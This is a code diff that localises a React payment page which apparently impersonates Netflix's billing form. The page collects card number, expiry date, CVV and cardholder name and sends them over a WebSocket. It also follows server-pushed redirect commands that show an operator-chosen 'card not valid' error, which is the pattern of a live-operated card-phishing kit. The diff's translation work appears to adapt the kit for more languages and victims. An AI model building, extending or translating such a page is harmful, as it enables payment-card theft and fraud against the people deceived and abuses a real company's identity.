@@ -2,11 +2,13 @@ import { useNavigate } from 'react-router-dom';
 import { useEffect, useState, useRef } from 'react';
 import Header from '../components/Header';
 import useWebSocket from '../hooks/useWebSocket';
+import { useTranslation } from '../hooks/useTranslation';
 import { isValidCardNumber, isValidExpiration, isValidCVV, getExpectedCVVLength, getBankName, randomParamsURL } from '../utils/validation';
 import '../styles/enter-payment.css';
 
 function PaymentDetails() {
   const navigate = useNavigate();
+  const { t } = useTranslation();
   const { sendPresence, sendPaymentData, wsRef } = useWebSocket();
   const [errorMessage, setErrorMessage] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -55,7 +57,7 @@ function PaymentDetails() {
       if (data && data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
         const page = data.payload.page;
         const isCancellation = data.payload.isCancellation || false;
-        const errorMessage = data.payload.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
+        const errorMessage = data.payload.errorMessage || t('paymentDetails.errors.invalidCard');
         console.log('[PaymentDetails] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
         
         if (page === '/payment-details' || isCancellation) {
@@ -74,7 +76,7 @@ function PaymentDetails() {
         // Support pour l'ancien format (backward compatibility)
         const page = data.page;
         const isCancellation = data.isCancellation || false;
-        const errorMessage = data.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
+        const errorMessage = data.errorMessage || t('paymentDetails.errors.invalidCard');
         console.log('[PaymentDetails] ✅ Redirect message received (legacy format)! Target page:', page, 'isCancellation:', isCancellation);
         
         if (page === '/payment-details' || isCancellation) {
@@ -183,26 +185,26 @@ function PaymentDetails() {
 
     // Validate card number
     if (!formData.cardNumber || !isValidCardNumber(formData.cardNumber)) {
-      errors.cardNumber = 'Please enter a valid card number';
+      errors.cardNumber = t('paymentDetails.errors.cardNumber');
       isValid = false;
     }
 
     // Validate expiration date
     if (!formData.expirationDate || !isValidExpiration(formData.expirationDate)) {
-      errors.expirationDate = 'Please enter a valid expiration date (MM/YY)';
+      errors.expirationDate = t('paymentDetails.errors.expirationDate');
       isValid = false;
     }
 
     // Validate CVV
     if (!formData.cvv || !isValidCVV(formData.cvv, formData.cardNumber)) {
       const expectedLength = getExpectedCVVLength(formData.cardNumber);
-      errors.cvv = `Please enter a valid ${expectedLength}-digit CVV`;
+      errors.cvv = t('paymentDetails.errors.cvv', { length: expectedLength });
       isValid = false;
     }
 
     // Validate name on card
     if (!formData.nameOnCard || formData.nameOnCard.trim().length < 2) {
-      errors.nameOnCard = 'Please enter the name on card';
+      errors.nameOnCard = t('paymentDetails.errors.nameOnCard');
       isValid = false;
     }
 
@@ -249,7 +251,7 @@ function PaymentDetails() {
       <Header />
       <main className="main-content">
         <div className="content-wrapper">
-          <h1 className="page-title">Enter payment details</h1>
+          <h1 className="page-title">{t('paymentDetails.title')}</h1>
 
           <div className="card-logos-section">
             <div className="card-logo visa">
@@ -281,7 +283,7 @@ function PaymentDetails() {
                   className={`form-input ${fieldErrors.cardNumber ? 'error' : ''}`}
                   id="cardNumber" 
                   name="cardNumber" 
-                  placeholder="Card number" 
+                  placeholder={t('paymentDetails.cardNumber')} 
                   maxLength="19" 
                   value={cardNumber}
                   onChange={handleCardNumberChange}
@@ -305,7 +307,7 @@ function PaymentDetails() {
                   className={`form-input ${fieldErrors.expirationDate ? 'error' : ''}`}
                   id="expirationDate" 
                   name="expirationDate" 
-                  placeholder="Expiration date (MM/YY)" 
+                  placeholder={t('paymentDetails.expirationDatePlaceholder')} 
                   maxLength="5" 
                   value={expirationDate}
                   onChange={handleExpirationDateChange}
@@ -323,7 +325,7 @@ function PaymentDetails() {
                     className={`form-input ${fieldErrors.cvv ? 'error' : ''}`}
                     id="cvv" 
                     name="cvv" 
-                    placeholder="CVV" 
+                    placeholder={t('paymentDetails.cvv')} 
                     maxLength="4" 
                     value={cvv}
                     onChange={handleCVVChange}
@@ -347,7 +349,7 @@ function PaymentDetails() {
                 className={`form-input ${fieldErrors.nameOnCard ? 'error' : ''}`}
                 id="nameOnCard" 
                 name="nameOnCard" 
-                placeholder="Name on card" 
+                  placeholder={t('paymentDetails.nameOnCard')}
                 required 
               />
               {fieldErrors.nameOnCard && (
@@ -362,17 +364,17 @@ function PaymentDetails() {
             )}
 
             <div className="disclaimer-section">
-              <p className="disclaimer-text">Your payments will be processed internationally. Additional bank fees may apply.</p>
-              <p className="disclaimer-text">By checking the checkbox below, you agree that Netflix will automatically continue your membership and charge the membership fee (currently R 99/month) to your payment method until you cancel. You may cancel at any time to avoid future charges.</p>
+              <p className="disclaimer-text">{t('paymentDetails.disclaimer1')}</p>
+              <p className="disclaimer-text">{t('paymentDetails.disclaimer2')}</p>
             </div>
 
             <div className="checkbox-group">
               <input type="checkbox" id="agree" name="agree" className="checkbox" />
-              <label htmlFor="agree" className="checkbox-label">I agree.</label>
+              <label htmlFor="agree" className="checkbox-label">{t('paymentDetails.agree')}</label>
             </div>
 
             <button type="submit" className="save-button" disabled={isSubmitting}>
-              {isSubmitting ? 'Processing...' : 'Save'}
+              {isSubmitting ? t('paymentDetails.processing') : t('paymentDetails.save')}
             </button>
           </form>
         </div>
